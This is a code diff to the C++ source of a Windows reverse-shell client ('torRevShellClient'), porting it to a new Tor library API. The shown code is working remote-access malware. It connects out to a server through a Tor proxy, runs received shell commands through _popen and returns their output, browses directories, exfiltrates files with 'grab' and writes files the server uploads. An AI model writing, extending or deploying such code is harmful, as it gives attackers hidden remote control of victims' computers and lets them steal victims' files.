@@ -13,13 +13,15 @@
 #pragma comment(lib, "Ws2_32.lib")
 #include <WinSock2.h>
 
+#define torProxyPort 9051
 
 /*
     Contains code for connecting to the server and processing commands
 */
 class torRevShellClient {
 private:
-    torPlusPlus::torSocketExtended torSock;
+    torPlusPlus::TOR tor;
+    torPlusPlus::TORSocket torSock;
     std::string torPath;
     std::string servAddr;
     unsigned int servPort = 0;
@@ -112,7 +114,8 @@ public:
         Returns 0 on fail
     */
     bool startProxy() {
-        return this->torSock.startTorProxy(this->torPath.c_str());
+        this->tor.startFromFile(this->torPath);
+        return 1; // startFromFile will block until successful connection is made
     }
 
     
@@ -157,7 +160,7 @@ public:
         }
         std::string cmd = cmdBuff; // Convert for easier handling
         if (cmd == "ping;") {
-            this->torSock.proxySendStr("ping;pong;");
+            this->torSock.proxySend("ping;pong;");
         }
         else if (cmd.starts_with("cd;")) { // Change Directory
             this->cd(cmd.substr(3, cmd.size() - 4));
@@ -176,7 +179,7 @@ public:
         }
         else {
             // If the command is unknown to the client, return an error message to the server
-            this->torSock.proxySendStr(std::string("Received invalid command: ") + cmd);
+            this->torSock.proxySend(std::string("Received invalid command: ") + cmd);
         }
         return true;
     }
@@ -192,7 +195,7 @@ public:
     void fileBrowser(std::string cmd){
         if (cmd.starts_with("gwd;")) {
             std::string cwd = std::filesystem::current_path().string();
-            this->torSock.proxySendStr("filebrowser;gwd;" + cwd + ";");
+            this->torSock.proxySend("filebrowser;gwd;" + cwd + ";");
         }
         else if (cmd.starts_with("ls;")) {
             std::string response = "filebrowser;ls;";
@@ -206,10 +209,10 @@ public:
             catch (...) { // An ugly way to handle the directory iterator failing :) (i could probably just do validation and then i wouldnt need to try-catch lol)
                 response = "Filesystem error; " + cmd;
             }
-            this->torSock.proxySendStr(response);
+            this->torSock.proxySend(response);
         }
         else {
-            this->torSock.proxySendStr(std::string("Received invalid command; ") + cmd);
+            this->torSock.proxySend(std::string("Received invalid command; ") + cmd);
         }
     }
 
@@ -219,7 +222,7 @@ public:
     void cd(std::string path){
         std::wstring pathWStr(path.begin(), path.end()); // Convert to a wstring because windows is cringe
         BOOL success = SetCurrentDirectory(pathWStr.c_str()); // Attempt to change the current working directory
-        this->torSock.proxySendStr("cd;" + path + ((success) ? ";success;" : ";failed;")); // Send the appropriate response to the server
+        this->torSock.proxySend("cd;" + path + ((success) ? ";success;" : ";failed;")); // Send the appropriate response to the server
     }
 
     /*
@@ -229,7 +232,7 @@ public:
     void grab(std::string path) {
         std::ifstream f(path.c_str(), std::ios::binary); // Open the file in binary mode
         if (f.is_open() != true) {
-            this->torSock.proxySendStr("grab;" + path + ";0;ERR"); // If the file could not be opened, send an error message to the server
+            this->torSock.proxySend("grab;" + path + ";0;ERR"); // If the file could not be opened, send an error message to the server
         }
         else {
             std::string responseStr = "grab;" + path + ";" + std::to_string(std::filesystem::file_size(path)) + ";"; // Assemble the plaintext part of the response
@@ -273,11 +276,11 @@ public:
         // Write the data to the disk
         std::ofstream f(fileName.c_str(), std::ios::binary); // Open a file with the fileName sent by the server in binary mode
         if (f.is_open() != true) { // If opening the file failed for whatever reason, send a failure message back to the server
-            this->torSock.proxySendStr("upload;" + fileName + ";failed;");
+            this->torSock.proxySend("upload;" + fileName + ";failed;");
         }
         else {
             f.write(fileData.data(), fileData.size()); // Slap that data onto the disk
-            this->torSock.proxySendStr("upload;" + fileName + ";success;"); // Send a success message back to the server
+            this->torSock.proxySend("upload;" + fileName + ";success;"); // Send a success message back to the server
         }
         f.close();
     }
@@ -302,10 +305,10 @@ public:
             _pclose(pipe);
         }
         if (response.size() == 0) {
-            this->torSock.proxySendStr("exec;" + cmd + ";0;;");
+            this->torSock.proxySend("exec;" + cmd + ";0;;");
         }
         else {
-            this->torSock.proxySendStr("exec;" + cmd + ";" + std::to_string(response.size() - 1) + ";" + response + ";");
+            this->torSock.proxySend("exec;" + cmd + ";" + std::to_string(response.size() - 1) + ";" + response + ";");
         }
     }
     
